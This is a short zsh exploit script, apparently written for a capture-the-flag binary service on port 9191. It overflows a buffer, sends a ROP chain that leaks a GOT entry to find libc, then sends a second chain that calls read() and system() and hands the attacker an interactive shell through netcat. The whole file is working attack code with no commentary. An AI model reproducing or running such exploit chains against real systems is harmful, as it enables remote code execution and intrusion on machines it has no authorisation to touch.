#!/bin/zsh

MS=~/moneyshot/moneyshot.py

WRITE=0x08048560
GOT=0x08049ff0
READ=0x000de440
SYSTEM=0x0003f430
PPPR=0x08048a1d
DATA=0x0804a044

BUF=`$MS rep A 272`

# write(fd, buf, sz)

ROPLEAK=`$MS dwords $WRITE 0xbadc0ded 4 $GOT 0x20`

READ_REMOTE=`echo "$BUF$ROPLEAK" | nc $1 9191 | tail -c +31 | $MS format dwords | grep 00000014 | awk '{ print $2 }'`

LIBC_BASE=$(( $READ_REMOTE - $READ ))

printf "LIBC IS @ %08x\n" $LIBC_BASE

SYSTEM_REMOTE=$(( $LIBC_BASE + $SYSTEM ))

printf "SYSTEM IS @ %08x\n" $SYSTEM

READ=0x080484d0

ROPPWN=`$MS dwords $READ $PPPR 4 $DATA 0x80 $SYSTEM_REMOTE 0xbadc0ded $DATA`

( echo "$BUF$ROPPWN" ; cat - ) | nc $1 9191
